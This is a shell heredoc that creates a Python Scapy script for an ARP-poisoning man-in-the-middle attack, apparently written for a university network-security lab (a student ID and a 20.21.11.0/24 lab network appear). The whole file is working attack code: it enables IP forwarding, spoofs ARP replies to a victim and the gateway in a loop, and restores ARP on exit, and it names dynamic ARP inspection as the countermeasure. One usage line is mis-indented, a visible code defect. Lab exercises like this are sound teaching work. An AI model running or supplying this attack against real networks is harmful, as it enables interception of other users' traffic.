cat > 02_arp_mitm.py << 'EOF'
#!/usr/bin/env python3
import sys, time, signal
from scapy.all import Ether, ARP, srp, send, get_if_hwaddr, conf, sniff, IP, TCP, Raw

INTERFAZ  = "eth0"
VICTIMA_A = None
VICTIMA_B = "20.21.11.1"
INTERVALO = 2
corriendo = True
mac_a = None
mac_b = None
mac_atk = None
enviados = 0

def salir(sig, frame):
    global corriendo
    print("\n[!] Restaurando ARP...")
    corriendo = False

def obtener_mac(ip):
    print(f"[*] Resolviendo MAC de {ip}...")
    conf.verb = 0
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 iface=INTERFAZ, timeout=3, retry=3)
    if not ans:
        print(f"[!] No se encontro {ip}")
        sys.exit(1)
    mac = ans[0][1].hwsrc
    print(f"[+] {ip} -> {mac}")
    return mac

def envenenar(target_ip, target_mac, spoof_ip):
    global enviados
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=spoof_ip, hwsrc=mac_atk),
         iface=INTERFAZ, verbose=False)
    enviados += 1

def restaurar(target_ip, target_mac, real_ip, real_mac):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=real_ip, hwsrc=real_mac),
         count=5, iface=INTERFAZ, verbose=False)
    print(f"[+] ARP restaurado para {target_ip}")

def main():
    global mac_a, mac_b, mac_atk, corriendo
    global INTERFAZ, VICTIMA_A
    signal.signal(signal.SIGINT, salir)
    conf.verb = 0
    
    if len(sys.argv) < 3:
    print(f"Uso: sudo python3 {sys.argv[0]} <interfaz> <ip_victima>")
    sys.exit(1)

    INTERFAZ = sys.argv[1]
    VICTIMA_A = sys.argv[2]

    print("=" * 50)
    print("  ATAQUE ARP MitM - Matricula 20211150")
    print("=" * 50)
    print(f"  Interfaz  : {INTERFAZ}")
    print(f"  Victima A : {VICTIMA_A}")
    print(f"  Victima B : {VICTIMA_B} (Gateway)")
    print(f"  Red       : 20.21.11.0/24")
    print("  Ctrl+C para detener y restaurar\n")

    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[+] IP forwarding activado")

    mac_atk = get_if_hwaddr(INTERFAZ)
    print(f"[+] MAC atacante: {mac_atk}")

    mac_a = obtener_mac(VICTIMA_A)
    mac_b = obtener_mac(VICTIMA_B)
    
    print("[*] Verificando conectividad...")

    if mac_a is None or mac_b is None:
        print("[!] No se pudieron resolver las MAC")
        sys.exit(1)

    print("[+] PC1 y Router detectados correctamente")

    print(f"\n[*] Envenenando ARP cada {INTERVALO}s...")
    print(f"    Verifica en PC1: arp -a")
    print(f"    20.21.11.1 debe mostrar MAC de Kali\n")

    try:
        while corriendo:
            envenenar(VICTIMA_A, mac_a, VICTIMA_B)
            envenenar(VICTIMA_B, mac_b, VICTIMA_A)
            if enviados % 10 == 0:
                print(f"  [+] ARP replies enviados: {enviados}", end="\r")
            time.sleep(INTERVALO)
    finally:
        restaurar(VICTIMA_A, mac_a, VICTIMA_B, mac_b)
        restaurar(VICTIMA_B, mac_b, VICTIMA_A, mac_a)
        print(f"\n[*] Total ARP enviados: {enviados}")
        print("  CONTRAMEDIDA: SW1(config)# ip arp inspection vlan 1")

if __name__ == "__main__":
    main()
EOF
echo "Script creado OK"
